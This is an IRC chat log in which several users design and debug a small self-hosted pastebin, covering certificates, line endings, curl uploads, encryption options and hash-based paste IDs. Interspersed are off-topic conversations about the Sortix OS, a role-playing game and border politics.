Jul 14 13:25:42 <sortie>	Mostly just for fun because I threatened to replace ahti's OS incrementally with Sortix
Jul 14 13:25:56 <sortie>	Heck I might start replacing bits and pieces like /bin/rm with Sortix
Jul 14 13:27:00 <zgrep>	sortie: As far as I know, musl doesn't do locale stuff.
Jul 14 13:27:01 <sortie>	Isn't that the spirit of open source? A shared server where people mix system software incrementally over time with random pieces from here and there as a franktenstein's monster
Jul 14 13:27:16 <sortie>	zgrep: It does do locale stuff. Way more than Sortix at least.
Jul 14 13:27:23 <zgrep>	Really?
Jul 14 13:27:30 <zgrep>	Huh.
Jul 14 13:27:33 <sortie>	It's not glibc level locale madness at least
Jul 14 13:27:57 <nortti>	hm, why does my man page say "Linux 4.14.54-0-vanilla" when I run it from inside ahtix?
Jul 14 13:28:10 <sortie>	Well I don't replace the utsname(2) system call
Jul 14 13:28:14 <nortti>	ah
Jul 14 13:28:39 <sortie>	nortti: nanovad: I kinda want to get Sortix working in the cloud so I can set up Sortix servers like this
Jul 14 13:28:56 <nortti>	makes sense
Jul 14 13:29:15 <sortie>	I just need a couple virtio drivers and maybe some PCI stuff and serial line stuff for debugging and then Sortix should be able to work on Google cloud
Jul 14 13:29:30 <nortti>	I guess the other big thing is security atm?
Jul 14 13:29:40 <sortie>	Nah mostly networking
Jul 14 13:29:51 <sortie>	I mean, I am strictly trying not to be remotely vulnerable
Jul 14 13:29:55 <sortie>	But locally vulnerable is okay for now

Jul 14 15:54:03 <S_Gautam>	the third point makes sense
Jul 14 15:54:35 <S_Gautam>	non-contacted tribes may not be immune to many diseases which non-tribal humans have developed immunity against
Jul 14 15:54:51 <shikhin>	The second doesn't? (The first doesn't seem very convincing.)
Jul 14 15:59:22 <S_Gautam>	Yeah, the first point talks about rights of the indigenous community towards self-determination. But I'm sure within the indigenous community there would be people wanting to get away. i mean, i agree that taking away land from them for industrialization and resources is unfair

Jul 15 02:49:57 <bslsk05>	​twitter: <Eatingartefacts> 'Ama-gi4' doesn't describe the abstract concept of 'freedom'. It is used to mean 'to be released from jail'. That might sound like a bad enough name for a night club, but it gets better. (2/4)

Jul 15 04:20:55 <john_cephalopoda>	S_Gautam: Italy wasn't a really good partner in WW2. They didn't want to join but wanted to appear willing, so they made demands that were so crazy that they thought that they wouldn't be fulfilled. But Hitler gave them that stuff anyway. So Italy had to join.
Jul 15 04:21:09 <S_Gautam>	well, I’m just speaking from what I’ve heard, the joke seems to be a common “Italy tries to be cool like the rest of Europe” trope.

Jul 15 05:50:39 <nortti>	also, I forget, was my landlord a ghost or not?
Jul 15 05:50:50 <sortie>	No a real landlord
Jul 15 05:51:01 <shikhin>	I remember very little of what I was up to. I infiltrated some place to get a story? Some riot something something possible sabotage (?).
Jul 15 05:51:02 <sortie>	We just joke about ‘elevator spirits‘ and such as an in-game religion
Jul 15 05:51:04 <nortti>	ah
Jul 15 05:51:48 <sortie>	For those new to the story, nortti wakes up on day 1 and finds 50 souvenirs and is stunned. nortti got one every year at the liberation festival. It's a family tradition. nortti seems to remember getting each one. nortti is not 50 years old.

Jul 15 05:53:02 <shikhin>	sortie: I thought you asked us not to read each other's storylines or something? Or maybe I made that up to justify not reading what was happening with nortti.

Jul 15 05:54:34 <shikhin>	Game show?
Jul 15 05:54:38 <sortie>	shikhin: Like, nortti has been buying groceries and managing people at work. You've infiltrated a space organization, barely made it out of riots, and then gotten captured by organized crime and forced to save your life in a game show paid for by hidden billionaires.
Jul 15 05:54:44 <shikhin>	Oh, yes.
Jul 15 05:54:51 <shikhin>	Now I remember. With a coworker?
Jul 15 05:54:56 <S_Gautam>	shikhin: in seriousness, it’s a conspiracy theory that the current American government is out to establish a new world order and is run by Jews/Reptilians/AI/Space Aliens. It’s used as a joke now whenever something seems suspicious
Jul 15 05:55:01 <sortie>	shikhin: Jackie, the one with the good ideas.

Jul 15 06:10:51 <shikhin>	I like the idea of having some symbols on the flag to represent crime.
Jul 15 06:11:22 <sortie>	The stars more represent the city
Jul 15 06:11:34 <sortie>	Some stuff towering over the ocean

Jul 15 06:24:04 <zgrep>	Ah.

Jul 15 06:25:05 <sortie>	shikhin encountered that a bit. There's the organized crime in plain sight, and then there's the people that make a business out of being unfindable by the government.

Jul 15 06:28:34 <sortie>	Aggeris is basically an IoT wet dream, without the insecurity
Jul 15 06:28:36 <zgrep>	So that counts as "need to", for the checkups (checking up on sensors, for example).
Jul 15 06:28:40 <zgrep>	:D:

Jul 15 06:30:43 <sortie>	The maintainers are very high tech. They have real time data about the whole system. Automated disaster recovery decisions are not made locally, but are made on the scene by the intact systems.

Jul 16 01:45:43 <S_Gautam>	nortti, judging from the news reports it seems that the borders on ground are undefined since Chinese troops get "lost" in Indian territory

Jul 16 01:51:35 <S_Gautam>	it's not better, and it would actually suck for the people there because a lot of nomadic tribes are present within those areas of Tibet. if we could force the governments to accept current borders it would be nice

Jul 16 01:54:59 <emily>	it seems to me that if all the states are doing is getting in the way of nomadic tribes living there, there's not much reason to want either of them to have it as territory
Jul 16 02:03:34 <zgrep>	nortti: :D Yup. I've heard / read that joke before. I like it.
Jul 16 02:04:28 <S_Gautam>	well, the claim is actually over the entire state Arunachal Pradesh (which China calls Southern Tibet) and I'm sure many of the people there identify as Indian, so there's no need to give up control, although the tribes could be left autonomous. As for borders, I can't freely visit Tibet without getting a permit from the Chinese government, can I? This already happened in 1962 when China managed to take a large chunk off India.
Jul 16 02:07:58 <S_Gautam>	unlike China, I have freedom of movement to resettle in any state of India I want to. I'm not interested in giving up that freedom

Jul 16 09:08:58 <nanovad>	I think zgrep mentioned an ssl command that you can use to add domain certs
Jul 16 09:09:47 <nchambers>	can do it easily with certbot. just -d domain1.com -d domain2.com
Jul 16 09:10:03 <nortti>	will either of you do it or shall I?
Jul 16 09:10:11 <nchambers>	AWS's cert manager makes it *really* easy if you use route53 for dns
Jul 16 09:10:29 <nanovad>	I'll do it

Jul 16 09:11:53 <nanovad>	I had an idea last night that you could add a comment to the HTML doc that sets an expiry timestamp
Jul 16 09:12:00 <nortti>	mh
Jul 16 09:12:39 <nortti>	that makes sense
Jul 16 09:13:17 <nortti>	and since you're generating the html yourself, you can say "it's always on line 3" and no need to build a real html parser
Jul 16 09:13:38 <nanovad>	yep
Jul 16 09:17:16 <nanovad>	Okay, `ssl add paste.ahti.space` is good
Jul 16 09:17:23 <nanovad>	I'll do the same for p.ahti.space too
Jul 16 09:25:00 <nortti>	atm paste.ahti.space works for me but not p.ahti.space (certificate only has former?)
Jul 16 09:25:06 <nanovad>	yeah, it's strange
Jul 16 09:25:10 <nanovad>	I'm trying to figure that out
Jul 16 09:25:21 <nanovad>	I added them both with `ssl`
Jul 16 09:25:56 <nortti>	did you run ssl renew?
Jul 16 09:26:35 <nanovad>	No renewal was needed, according to it
Jul 16 09:27:09 <nanovad>	I think I'm going to restart h2o
Jul 16 09:27:33 <nchambers>	it won't think a renew is needed if you just issued a cert, iirc
Jul 16 09:29:02 <nanovad>	aaaaand h2o's dead
Jul 16 09:29:14 <nanovad>	missed a colon in the conf. `service` won't let me bring it up because it came up and crashed

Jul 16 09:36:33 <nanovad>	Probably a side effect of the translation from HTML
Jul 16 09:37:08 <nortti>	you create the .txt from the .html?

Jul 16 09:37:34 <bslsk05>	​<nortti*> hm, are you aware that nanopaste creates lines with dos-style line separators instead of unix-style line endings?
Jul 16 09:37:45 <nanovad>	no, but the content is written directly from the POST content, so it's probably something to do with the browser sending newlines as \r\n
Jul 16 09:37:52 <nortti>	ah
Jul 16 09:38:22 <nanovad>	(in the HTML file it's written as html.escape(content), in the .txt file it's just f.write(content))
Jul 16 09:38:29 <nortti>	mh
Jul 16 09:38:49 <nortti>	I'd personally get rid of the '\r's and add a '\n' to the end, since it is a unix system
Jul 16 09:39:10 <nanovad>	yeah
Jul 16 09:40:12 <nanovad>	"Line breaks are represented as "CR LF" pairs (i.e., `%0D%0A')."
Jul 16 09:43:22 <nanovad>	I guess you could just use string substitution, replace \r\n with \n
Jul 16 09:43:44 <nortti>	yeah
Jul 16 09:43:55 <nortti>	content = content.replace('\r\n', '\n') + '\n'

Jul 16 18:50:14 <nanovad>	(p.ahti.space as well)
Jul 16 18:50:36 <shikhin>	Yes and yes.
Jul 16 18:50:59 <shikhin>	Any plans on adding encryption and coloring (so I can start using this permanently)?
Jul 16 19:00:49 <nanovad>	I'm not really sure how to do encryption tbh
Jul 16 19:01:30 <nanovad>	Coloring could be done post-paste injected into the HTML I think
Jul 16 19:01:51 <shikhin>	I think zgrep mentioned pygments, that looks neat.

Jul 16 19:14:51 <nanovad>	What sort of encryption are you thinking, shikhin?
Jul 16 19:16:07 <shikhin>	The tough kind.
Jul 16 19:16:18 <nanovad>	ah, sha1
Jul 16 19:16:55 <nanovad>	Basically the 3 main features I want are expiration, coloring, and encryption, but I am not sure how to do encryption.
Jul 16 19:17:32 *	shikhin would google "how to do encryption <language-name>".
Jul 16 19:18:49 <nanovad>	Well, it's more of a question of end to end, or just encrypted storage of pastes, etc
Jul 16 19:18:59 <nanovad>	I honestly don't see the point
Jul 16 19:19:06 <hydraz>	remind me what the need for encryption is?
Jul 16 19:19:55 <shikhin>	I don't want you to read what I create pasties of.
Jul 16 19:20:07 <rain1>	why not make the URL secret then? a long random string
Jul 16 19:20:19 <shikhin>	Everyone uses the same server, rain1.
Jul 16 19:20:33 <rain1>	oh, so you don't want plaintext stored on the server
Jul 16 19:20:39 <nanovad>	Uhhhh.
Jul 16 19:20:46 <nanovad>	Isn't the idea of a pastebin to share the paste?
Jul 16 19:20:57 <shikhin>	Not with everyone!
Jul 16 19:21:01 <nanovad>	:|
Jul 16 19:21:09 <shikhin>	rain1: Yeah.
Jul 16 19:21:23 <rain1>	it's difficultto achieve this in a satisfactory way using existing web stuff
Jul 16 19:21:25 <nanovad>	So you want pastes to be stored on the server encrypted, then decrypted and sent to the user?
Jul 16 19:21:44 <nanovad>	Slash whomever wants to see them
Jul 16 19:21:49 <shikhin>	Yeah?
Jul 16 19:21:59 <nanovad>	That sounds useless.
Jul 16 19:22:00 <rain1>	maybe you could have a script that uses GPG to encrypt the data then pastes that, and a script to read a paste and decrypt it
Jul 16 19:22:13 <shikhin>	nanovad: Why?
Jul 16 19:22:26 <nanovad>	How do you determine who can see the data?
Jul 16 19:22:35 <shikhin>	B-by the key?
Jul 16 19:22:40 *	shikhin blinks.
Jul 16 19:23:03 <nanovad>	So you... You want data to be stored on the server encrypted, and you want to give people a key to whatever so they can see it.
Jul 16 19:23:09 <shikhin>	Yes?
Jul 16 19:23:13 *	shikhin blinks yet again.
Jul 16 19:23:18 <nanovad>	So why not encrypt your own file and upload it?
Jul 16 19:23:31 <nanovad>	I don't see why it's the paste servers job, I gudss
Jul 16 19:23:31 <shikhin>	lol
Jul 16 19:23:32 <nanovad>	Guess*
Jul 16 19:24:04 <rain1>	nanovad: the solution I just proposed decouples it, so encryption isn't implemented as part of the webapp
Jul 16 19:24:25 <shikhin>	Your wish, your application, I'm not sure what to say now. This is what nortti's pastie thing did so it doesn't seem to be crazy to me, this is what I expect / want / like, so, uh... *shrug*
Jul 16 19:24:27 <nanovad>	rain1: it's basically just a single python script
Jul 16 19:24:46 <nanovad>	shikhin: I'm just trying to understand, never used a server that does that, so
Jul 16 19:25:01 <rain1>	not sure what you mean by that
Jul 16 19:25:03 <CompanionCube>	wtf
Jul 16 19:25:12 <nanovad>	rain1: the interface is HTML, which posts to a CGI script, which saves to the FS and generates a link
Jul 16 19:35:46 <zgrep>	Any encryption would happen on the JS side, and therefore can be implemented purely in the interface.
Jul 16 19:35:57 <rain1>	I would advise against doing it in js
Jul 16 19:36:05 <zgrep>	Well, the alternative is server-side, which is worse. :P
Jul 16 19:36:18 <rain1>	you can do it in a client like I proposed
Jul 16 19:36:24 <zgrep>	Then it's no longer a pastebin site.
Jul 16 19:36:40 <zgrep>	Then it's just, uh, gpg + curl, or something.
Jul 16 19:39:02 <nanovad>	There's no JS. 
Jul 16 19:39:31 <nanovad>	zgrep is thinking of what I'm getting at. 
Jul 16 19:39:59 <nanovad>	Just hard to type on my phone. 
Jul 16 19:40:01 <zgrep>	Completely unrelated suggestion: make it index.cgi or something (and make h2o accept that as an index file, if necessary), so that I can upload to p.ahti.space with curl, and be happy. :P
Jul 16 19:40:28 <nanovad>	Hmm, does curl do POST?
Jul 16 19:40:33 <zgrep>	Of course. ._.
Jul 16 19:40:42 <nanovad>	I don't use curl, so...
Jul 16 19:40:46 <nanovad>	But I could do that. 
Jul 16 19:40:57 <nanovad>	I think. 
Jul 16 19:41:04 <zgrep>	I-it's the standard thingy for doing web stuff from a terminal. wget is evil. :P
Jul 16 19:41:16 <nanovad>	Don't know how I'd set it up though. Have to research
Jul 16 19:41:22 <nanovad>	What's wrong with wget?
Jul 16 19:41:38 <zgrep>	So many weird options, and it still doesn't do what I want when I want it to do something useful. :P
Jul 16 19:41:49 *	zgrep probably uses wget somewhere for some script.
Jul 16 19:42:37 <zgrep>	I think I had annoyances with the way I needed to specify things for recursively downloading an entire website.
Jul 16 19:43:16 <zgrep>	That said, curl doesn't have that ability at all because it restricts itself to downloading the data, and not parsing the data (it does parse the headers, I think).
Jul 16 19:43:37 <nanovad>	Interesting. 
Jul 16 19:44:03 <zgrep>	Huh. curl does a lot, apparently. According to its man page.
Jul 16 19:44:31 <zgrep>	I don't know why, but I've always seen curl as "nicer".
Jul 16 19:44:41 <nanovad>	Thing is, I don't know how I'd get the data from the paste interface into the cgi script if the cgi script was doing the presenting and receiving of the POST.
Jul 16 19:44:59 <zgrep>	Hm? It'd just upload to the same page with a POST request?
Jul 16 19:45:18 <nanovad>	Don't know how to check what kind of request the script is getting though
Jul 16 19:45:23 <zgrep>	Err.
Jul 16 19:45:30 <zgrep>	If you get the POST variable with data, you do one thing.
Jul 16 19:45:32 <zgrep>	If not, you do the other.
Jul 16 19:45:44 <nanovad>	Seems hacky to rely on an empty var
Jul 16 19:45:52 <zgrep>	N-not really. I think that's how pretty much everywhere does it.
Jul 16 19:45:54 <nanovad>	Don't know if uploading an empty paste would give the same condition
Jul 16 19:46:03 <zgrep>	Well, why would you want to upload an empty paste.
Jul 16 19:46:06 <nanovad>	Though worst case the page just gets reloaded
Jul 16 19:46:17 <nanovad>	People are going to fuck up what you make in strange ways, zgrep
Jul 16 19:46:28 <zgrep>	By aggressively spamming empty pastes.
Jul 16 19:46:31 <nanovad>	Gotta be ready for "why did the user do that?"
Jul 16 19:46:36 <nanovad>	Yes :L
Jul 16 19:46:39 <nanovad>	:P*
Jul 16 19:46:43 <zgrep>	I mean, why would you want to support empty pastes as a feature? :P
Jul 16 19:46:53 <nanovad>	I don't, but I want to give an error 
Jul 16 19:47:00 <nanovad>	(like it does now)
Jul 16 19:47:21 *	nanovad . o O ( "internal server error" )
Jul 16 19:48:06 <shikhin>	nanovad: Oh, maybe this wasn't how you envisioned it--you'd just pass the key around in the URL? There'd be no convenience loss except a slightly longer URL.
Jul 16 19:48:23 <nanovad>	Ah
Jul 16 19:48:50 <nanovad>	So the paste is encrypted on the server and you give whomever you want to see it a URL with the key. Server doesn't get snooped, data is encrypted until presentation
Jul 16 19:49:03 <shikhin>	(And perhaps there'd be a button to disable encryption.)
Jul 16 19:49:20 <zgrep>	Err.
Jul 16 19:49:22 <rain1>	that doesn't sound secure
Jul 16 19:49:23 <zgrep>	Then it's no longer encryption.
Jul 16 19:49:34 <shikhin>	W-what?
Jul 16 19:49:46 <zgrep>	If it's encrypted on the server, the way it currently works, is that it saves it with the hash.
Jul 16 19:49:49 <zgrep>	When you decrypt, the hash changes.
Jul 16 19:49:56 <zgrep>	You'd get a new paste.
Jul 16 19:50:01 <nanovad>	Nah, hold on
Jul 16 19:50:03 *	shikhin blinks.
Jul 16 19:50:10 <nanovad>	okay, on a real keyboard
Jul 16 19:50:16 <nanovad>	So the hash is generated directly from the POST content
Jul 16 19:50:34 <nanovad>	assuming you POST unencrypted data, you encrypt it, hash it, and save the encrypted data with a matching (but potentially truncated) SHA256
Jul 16 19:50:50 <nanovad>	User asks for the hash, gets the hash of encrypted data and its content, decrypts it, has no need for the hash of the decrypted data
Jul 16 19:51:07 *	zgrep blinks.
Jul 16 19:51:14 <zgrep>	Why am I sending this in plain text to the server now?
Jul 16 19:51:22 <rain1>	It's best that encryption is done by the client. Not by the web browser or the server. That's why I proposed using a script that applies GPG then pastes 
Jul 16 19:51:23 <nanovad>	Well you'd kinda have to.
Jul 16 19:51:33 <zgrep>	rain1: Wait, how do I verify that the client hasn't been tampered with! :P
Jul 16 19:51:34 <nanovad>	Either in the webpage or in the CGI script.
Jul 16 19:51:39 <nanovad>	or
Jul 16 19:51:41 <nanovad>	OR
Jul 16 19:51:47 <rain1>	check the client source code
Jul 16 19:51:50 <nanovad>	we assume nothing is secure and never implement encryption
Jul 16 19:51:54 *	nanovad casts his vote
Jul 16 19:52:11 <zgrep>	rain1: But I don't know how to read the obfuscated C++ with 20 libraries that the client is obviously written in.
Jul 16 19:52:40 <zgrep>	nanovad: I like that option.
Jul 16 19:53:00 *	nanovad . o O ( "encryption is a bikeshed. I can shave 3 weeks off our deployment deadline" *rest of the team groans* )
Jul 16 19:53:01 <rain1>	what are you talking about?
Jul 16 19:53:31 <zgrep>	rain1: I was being hyperbolic. Also, you could just as easily also say that the client *is* the JS, and you can read the JS source yourself.
Jul 16 19:53:42 <rain1>	no
Jul 16 19:53:44 <zgrep>	Why not?
Jul 16 19:54:05 <zgrep>	If you want to make sure nobody tampers with it, save a copy of the page yourself.
Jul 16 19:54:10 <zgrep>	That's downloading the executable.
Jul 16 19:54:16 <zgrep>	There's your client.
Jul 16 19:54:33 <rain1>	doesn't seem like a good idea
Jul 16 19:54:47 <rain1>	just use a simple shell script that applies GPG then posts using curl
Jul 16 19:54:55 <nanovad>	right, that works too
Jul 16 19:54:58 <nanovad>	but the paste server don't care
Jul 16 19:55:00 <zgrep>	Well, that'd work regardless. :P
Jul 16 19:55:08 <nanovad>	AFAIK you can paste raw binary, but I haven't tested that
Jul 16 19:55:10 <zgrep>	:D
Jul 16 19:55:14 <rain1>	nanovad: yeah I said earlier that the encryption part of the system is decoupled from the webapp
Jul 16 19:55:14 <zgrep>	I'm going to post bash now.

Jul 16 20:02:24 <nanovad>	that's… that's what it is
Jul 16 20:02:38 <zgrep>	N-no. It's sending "paste_content=the content goes here".
Jul 16 20:02:52 <zgrep>	Which means if I use curl, I have to type "paste_content=stuff".

Jul 16 20:04:39 <nanovad>	"content"?

Jul 16 20:13:00 <zgrep>	Or explicit.
Jul 16 20:13:04 <zgrep>	Note: it can be implicit.
Jul 16 20:13:16 <zgrep>	nanovad: And a <!DOCTYPE html> to the beginning.
Jul 16 20:13:51 <zgrep>	Also <body> can be implicit. And <html>. But <pre> does need to be closed at the end, apparently.
Jul 16 20:14:42 <zgrep>	For example, view-source:https://soluble.zgrep.org/index.html is valid HTML5.
Jul 16 20:14:44 <bslsk05>	​soluble.zgrep.org: zgrep.org
Jul 16 20:14:49 *	nanovad hates web tech
Jul 16 20:15:02 <nanovad>	awful shit
Jul 16 20:15:12 <zgrep>	Indeed.
Jul 16 20:15:22 <nanovad>	rain1: see .txt instead of .html
Jul 16 20:15:44 <nanovad>	zgrep: Hm, I thought it was sufficient to put it in the Content-Type
Jul 16 20:15:49 <nanovad>	(utf-8)
Jul 16 20:15:51 <zgrep>	nanovad: It is. But it's always good to be safe.
Jul 16 20:15:56 <nanovad>	blech
Jul 16 20:16:51 <nanovad>	zgrep: I like the sections being explicit in the generated doc.
Jul 16 20:17:05 <zgrep>	nanovad: Ah, okay. Feel free to do whatever you wish, of course. :P
Jul 16 20:17:13 <nanovad>	hehe
Jul 16 20:17:39 <nanovad>	Thanks for the tips
Jul 16 20:19:19 <nanovad>	zgrep: how do the generated pages look now?
Jul 16 20:22:36 <zgrep>	nanovad: Nice. Except the old ones are still bad. :P
Jul 16 20:22:55 *	nanovad shrugs
Jul 16 20:23:14 <zgrep>	nanovad: You also add an extra newline at the end of my paste.
Jul 16 20:23:24 <shikhin>	That
Jul 16 20:23:29 <shikhin>	Oh.
Jul 16 20:23:50 <shikhin>	nanovad: I saw nortti saying something like + '\n' - hopefully you don't do that when there's already a newline at the end?
Jul 16 20:24:37 <zgrep>	I'd prefer that only happen if I'm using the web UI.
Jul 16 20:24:48 <shikhin>	< zgrep> E-every time I paste "test", I get the "next" shorturl, and that's a feature?  <- Y-yes? That's a very good feature.
Jul 16 20:24:54 <zgrep>	shikhin: Why?
Jul 16 20:24:54 <shikhin>	Different expiration times, for one.
Jul 16 20:25:03 <shikhin>	Encryption or not, different coloring schemes, etc.
Jul 16 20:25:09 *	zgrep blinks.
Jul 16 20:25:09 <shikhin>	Your test is not my test.
Jul 16 20:25:23 <emily>	I-I like the culture of stuttering here.
Jul 16 20:25:30 <shikhin>	:D
Jul 16 20:25:49 <zgrep>	shikhin: If it's the exact same contents... it's the exact same contents. In that case it goes with whoever set the longer expiration date.
Jul 16 20:26:40 <shikhin>	zgrep: What if I want to share the same set of content with you and with my other friend (who most definitely exists), but want you both to get different expiry times?
Jul 16 20:27:06 <zgrep>	shikhin: That's stupid. Then they hash the contents themselves and search for the other one.
Jul 16 20:27:15 <shikhin>	Hm?
Jul 16 20:27:19 <shikhin>	What?
Jul 16 20:27:53 <shikhin>	Ah, I see what you mean. Salt the hash.
Jul 16 20:28:02 <zgrep>	Hmm.
Jul 16 20:28:08 <zgrep>	T-they can still see all hashes smaller than theirs.
Jul 16 20:28:24 <shikhin>	Yes, but a collision would be improbable.
Jul 16 20:28:40 <zgrep>	What if you do your pastes in the wrong order, and the one with the shorter expiry gets the longer hash.
Jul 16 20:28:43 <shikhin>	It could just be something that agrees on the first X characters and disagrees afterwards.
Jul 16 20:28:48 <shikhin>	What?
Jul 16 20:29:03 <zgrep>	I mean, you paste the same contents twice.
Jul 16 20:29:03 <shikhin>	That wouldn't happen because salt so the two pastes won't get the same hash.
Jul 16 20:29:22 <zgrep>	If the salt is different every time, how is doing a hash any better than generating a guid?
Jul 16 20:29:31 <zgrep>	Or simply choosing random characters.
Jul 16 20:29:39 <shikhin>	If you want to, sure?
Jul 16 20:29:47 <zgrep>	Then what's the point of hashing to begin with?
Jul 16 20:29:54 <shikhin>	You say that as if I wrote the code.
Jul 16 20:30:15 <zgrep>	I assumed the point of hashing was to economize on identical-contents pastes.
Jul 16 20:30:23 <zgrep>	nanovad: So what's the point of hashing anyway? :P
Jul 16 20:30:33 <nanovad>	I always add a newline, no matter if there's already a newline.
Jul 16 20:30:37 <emily>	I like hashing bceause content-addressed stores are nice.
Jul 16 20:30:41 <emily>	and determinism is nice.
Jul 16 20:30:43 <nanovad>	well
Jul 16 20:30:49 <nanovad>	The hashes get permanently truncated where possible
Jul 16 20:30:54 <nanovad>	Just a way of generating a non-linear unique ID
Jul 16 20:31:04 <shikhin>	I dislike hashing because I don't want someone else to take over my paste.
Jul 16 20:31:34 *	zgrep . o O ( Generating random numbers is cheaper than hashing, I think. )
Jul 16 20:31:43 *	zgrep . o O ( At these sizes, it doesn't really matter, though. )
Jul 16 20:32:51 <zgrep>	shikhin: Hm? T-they can only take over your paste if it's the same hash (or hash-beginning) which either means it's the same content, and they took over your paste with the same paste, or something very unlikely has happened.
Jul 16 20:33:15 <shikhin>	zgrep: Disable encryption or add coloring or things of that sort.
Jul 16 20:33:38 <nanovad>	zgrep: until the random numbers collide.
Jul 16 20:33:40 <shikhin>	Or change expiry times.
Jul 16 20:33:40 <zgrep>	shikhin: I still don't understand how the encryption would, uh, happen. And where it would happen.
Jul 16 20:33:57 <zgrep>	How would you verify that you're still you when modifying a paste?
Jul 16 20:34:03 <shikhin>	Hm?
Jul 16 20:34:08 <shikhin>	You wouldn't modify a paste.
Jul 16 20:34:18 <nanovad>	You wouldn't download a car
Jul 16 20:34:19 <zgrep>	Err, paste metadata.
Jul 16 20:34:25 <shikhin>	Hm?
Jul 16 20:34:34 <zgrep>	Expiry time is part of paste metadata, is it not?
Jul 16 20:34:35 <shikhin>	You wouldn't modify paste metadata.
Jul 16 20:34:37 <zgrep>	How would you, uh, change it?
Jul 16 20:34:41 <shikhin>	Pastes are immutable.
Jul 16 20:34:48 <shikhin>	Use gist if you want something this fancy. :P
Jul 16 20:34:51 <zgrep>	Then what did you mean by "Or change expiry times.".
Jul 16 20:35:05 <shikhin>	You could paste "test" with the expiry time set to 1 hour.
Jul 16 20:35:09 <shikhin>	I could paste "test" with no expiry time.
Jul 16 20:35:12 <shikhin>	What does the server do?
Jul 16 20:35:13 <zgrep>	nanovad: That's even more unlikely than the hashes colliding, I believe.
Jul 16 20:35:47 <zgrep>	shikhin: It makes two separate pastes. That's not changing the expiry time, that's making a new paste with a different expiry time.
Jul 16 20:36:00 <shikhin>	zgrep: So the hash is not based on the contents, as you wanted?
Jul 16 20:36:20 <zgrep>	I'm confused.
Jul 16 20:36:38 <shikhin>	As am I. I thought you wanted the pastes for "test" to be the same always.
Jul 16 20:36:59 <zgrep>	Ah. If we're going with that variant, then it goes with the longer one: forever.
Jul 16 20:37:00 <nanovad>	could be
Jul 16 20:37:21 <zgrep>	shikhin: I did say that it goes with the longer of two expiry times. There would also not, uh, be a "forever" expiry time.
Jul 16 20:37:24 <shikhin>	zgrep: Then you just took over my paste.
Jul 16 20:37:36 <shikhin>	I shared it with the expectation of it expiring in one hour. Now people can see it forever.
Jul 16 20:38:54 <zgrep>	shikhin: Err. If it's the same contents, and I shared it with the expectation of it expiring in forever, I can then share that same paste with other people... Also, again, there wouldn't be a forever expiry date.
Jul 16 20:39:08 <shikhin>	What?
Jul 16 20:39:37 <zgrep>	Hmm.
Jul 16 20:39:38 <zgrep>	Hmmmm.
Jul 16 20:41:02 <zgrep>	You're right, it would be hijacking your paste... so then, I don't see the problem in doing that? I can just as easily copy your paste, and make my own with the same contents that expires in 3 months, instead of the 1 day you wanted. And then I share that with whomever I wanted to share it to.
Jul 16 20:42:13 <zgrep>	What's the problem with extending a paste's duration, when I can do that manually as well?
Jul 16 20:42:42 <shikhin>	zgrep: Sure. But if I shared it with other channels and it remains unexpired there too?
Jul 16 20:43:13 <zgrep>	shikhin: What are you putting in this paste that you want to share in all of the channels, but have expire in some?
Jul 16 20:43:27 <shikhin>	Er.
Jul 16 20:43:46 <shikhin>	I pasted "embarrassing stuff". I shared here with an expiry of 1hr.
Jul 16 20:43:59 <zgrep>	M'kay.... then what?
Jul 16 20:44:02 <shikhin>	Coincidentally, you pasted "embarrassing stuff" too. You set the expiry to 3 months.
Jul 16 20:44:10 <shikhin>	Now people here can see my paste for 3 months. I don't want that.
Jul 16 20:44:15 <zgrep>	If our embarrassing stuff is *identical*.
Jul 16 20:44:23 <shikhin>	Yes.
Jul 16 20:44:26 <shikhin>	That's why it's in quotes.
Jul 16 20:44:52 <shikhin>	There's also another difference between me sharing something and you copying it and resharing it.
Jul 16 20:44:55 <zgrep>	I don't see why the fact that it expires in 3 months is now a problem, though. Why don't you want that? What would having it expire in 1hr accomplish?
Jul 16 20:45:01 <shikhin>	In one case, I *said the link myself*. In the other, you said it.
Jul 16 20:45:11 *	shikhin blinks.
Jul 16 20:45:34 <shikhin>	"Why do you want a link with an expiry in 1hr?"  Is that really your question?
Jul 16 20:46:16 <zgrep>	Almost.
Jul 16 20:46:22 *	zgrep tries to put it into words.
Jul 16 20:46:44 <zgrep>	Err, well, to get to what I'm trying to say, sure: tell me why you want a link with an expiry of 1hr.
Jul 16 20:46:57 <shikhin>	I won't.
Jul 16 20:47:02 <zgrep>	Why not?
Jul 16 20:47:33 <shikhin>	It's a silly question. Surely you have used the 1 hour expiry thing on pastebin? If you have, there, there's a need.
Jul 16 20:47:49 <shikhin>	If there's a need and if you set something, someone else shouldn't be able to change it at the exact same URL.
Jul 16 20:48:13 <shikhin>	The reason for the need shouldn't matter (and me giving some arbitrary reason will probably mean you'll challenge the need and not the principle).
Jul 16 20:48:51 <zgrep>	I have used the expiry thing, but in retrospect, I honestly don't see why I did it.
Jul 16 20:49:40 <shikhin>	Alright, have this.
Jul 16 20:49:50 <zgrep>	Rather, I believe that the only time it's useful is to have the paste expire *at some point*.
Jul 16 20:49:56 <zgrep>	Instead of being kept forever.
Jul 16 20:50:03 <shikhin>	I once shared a paste in here of an essay I wrote.
Jul 16 20:50:16 <shikhin>	Anonymously, didn't have my name on it, etc.
Jul 16 20:50:53 <shikhin>	There was a one-day expiry set because I don't like things I have written floating around. If it hadn't expired, someone could find it in the logs and I really don't want that.
Jul 16 20:51:05 <zgrep>	A-and why would somebody paste your essay in again with the malicious intent of extending an expiry?
Jul 16 20:51:10 <shikhin>	Someone in my class found the same essay and copied it.
Jul 16 20:51:18 <zgrep>	A-and pasted it into the same service?
Jul 16 20:51:26 <shikhin>	No, but what if they did?
Jul 16 20:51:36 <zgrep>	They could easily paste it into a different service and share your essay as well, but also add attribution!
Jul 16 20:51:43 <shikhin>	Sure?
Jul 16 20:51:52 <zgrep>	S-so what's the point of trying to keep this particular URL, then?
Jul 16 20:51:53 <shikhin>	I'm not sure what your point is.
Jul 16 20:52:15 <zgrep>	Why do you want the paste for that particular URL to expire, then? Why do you care about the URL in particular?
Jul 16 20:52:17 <shikhin>	I just gave you a real story where someone could *plausibly* also have taken over my paste.
Jul 16 20:52:23 <S_Gautam>	https://i.imgur.com/g6GBUeK.jpg "Two loves go on a date (through Facebook), find out they were husband and wife"
Jul 16 20:52:23 <bslsk05>	​i.imgur.com: image/jpeg [31.392 kilobytes]
Jul 16 20:52:27 <shikhin>	Y-your reply is they could have done other things too? Yes, that's true, they did do other things.
Jul 16 20:52:40 <zgrep>	Then I don't see how taking over a paste is any worse...
Jul 16 20:52:44 <shikhin>	zgrep: Because it's linked with me in this channel.
